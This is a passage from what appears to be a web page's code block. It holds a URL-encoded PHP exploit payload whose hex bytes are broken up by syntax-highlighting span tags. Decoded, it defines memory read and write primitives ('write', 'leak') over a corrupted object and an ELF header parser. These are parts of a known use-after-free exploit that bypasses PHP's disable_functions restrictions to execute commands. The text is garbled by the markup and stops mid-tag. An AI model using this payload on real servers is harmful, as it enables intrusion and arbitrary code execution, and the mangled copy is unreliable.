class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">25</span>%<span class="hljs-number">63</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">26</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">5</span>b%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">25</span>%<span class="hljs-number">63</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">76</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">62</span>%<span class="hljs-number">63</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">3</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">31</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">65</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">70</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">7</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">79</span>%<span class="hljs-number">70</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">70</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">68</span>%<span 